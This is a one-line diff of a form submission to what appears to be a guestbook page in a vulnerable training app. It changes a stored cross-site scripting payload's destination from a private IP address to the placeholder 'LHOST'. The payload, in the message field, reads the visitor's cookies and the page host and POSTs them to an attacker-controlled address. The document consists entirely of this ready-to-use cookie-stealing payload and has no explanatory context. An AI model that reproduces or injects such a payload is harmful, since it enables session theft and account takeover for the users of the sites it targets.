@@ -1,1 +1,1 @@
-txtName=test&mtxMessage=<script>var xmlhttp = new XMLHttpRequest(); xmlhttp.open("POST", "http://172.16.156.132", true);xmlhttp.send(JSON.stringify({hostname: window.location.host, cookies:document.cookie}));</script>&btnSign=Sign+Guestbook
+txtName=test&mtxMessage=<script>var xmlhttp = new XMLHttpRequest(); xmlhttp.open("POST", "http://LHOST", true);xmlhttp.send(JSON.stringify({hostname: window.location.host, cookies:document.cookie}));</script>&btnSign=Sign+Guestbook
